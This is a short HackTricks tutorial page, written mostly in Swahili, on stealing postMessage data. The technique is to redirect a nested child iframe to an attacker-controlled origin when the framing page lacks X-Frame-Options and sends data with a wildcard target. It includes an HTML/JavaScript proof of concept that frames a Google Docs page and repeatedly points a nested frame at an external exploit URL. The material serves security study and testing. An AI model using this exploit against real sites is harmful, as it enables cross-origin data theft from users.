# Steal postmessage modifying iframe location

{{#include ../../banners/hacktricks-training.md}}

## Kubadilisha maeneo ya iframes za watoto

Kulingana na [**hii andiko**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), ikiwa unaweza iframe ukurasa wa wavuti bila X-Frame-Header ambao una iframe nyingine, unaweza **kubadilisha eneo la iframe hiyo ya mtoto**.

Kwa mfano, ikiwa abc.com ina efg.com kama iframe na abc.com haina X-Frame header, naweza kubadilisha efg.com kuwa evil.com cross origin kwa kutumia, **`frames.location`**.

Hii ni muhimu sana katika **postMessages** kwa sababu ikiwa ukurasa unatumia data nyeti kwa kutumia **wildcard** kama `windowRef.postmessage("","*")` inawezekana **kubadilisha eneo la iframe inayohusiana (mtoto au mzazi) kuwa eneo lililodhibitiwa na mshambuliaji** na kuiba data hiyo.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
//pseudo code
setTimeout(function () {
exp()
}, 6000)

function exp() {
//needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created
setInterval(function () {
window.frames[0].frame[0][2].location =
"https://geekycat.in/exploit.html"
}, 100)
}
</script>
</html>
```
{{#include ../../banners/hacktricks-training.md}}
